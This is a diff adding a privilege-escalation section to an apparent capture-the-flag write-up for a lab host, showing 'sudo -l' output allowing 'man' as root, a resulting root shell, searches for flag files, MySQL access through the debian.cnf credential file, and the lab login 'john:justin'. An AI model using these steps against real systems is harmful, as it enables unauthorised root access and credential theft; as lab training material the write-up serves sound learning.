@@ -492,8 +492,38 @@ We got the last flag `flag{a260af638f07d39c838810eda005ceb3}`
 
 #### Privesc
 
+For the second way is just straightforward, follow on the first way after use `sudo -l`
 
+```bash
+john@hydrogrencorp:~$ sudo -l
+[sudo] password for john: 
+Matching Defaults entries for john on this host:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    insults
 
+User john may run the following commands on this host:
+    (root) /usr/bin/man
+```
+
+We can get all flag2, flag4 and flag5
+
+```bash
+root@hydrogrencorp:/usr/share/man# find / -name "flag2.txt" 2>/dev/null
+/usr/share/nginx/www/wordpress.bak/flag2.txt
+/usr/share/nginx/www/wordpress/flag2.txt
+root@hydrogrencorp:/usr/share/man# find / -name "flag4.txt" 2>/dev/null
+/root/flag4.txt
+root@hydrogrencorp:/usr/share/man# mysql --defaults-file=/etc/mysql/debian.cnf
+```
+
+We got all flag huhu.
+
+## Bonus
+
+For the flag 5, we also can use phpmyadmin website account or mysql command to find it by using credentials `john:justin`
+
+![](/images/writeup/internship/hidrogen/theend.gif)
 
 
 
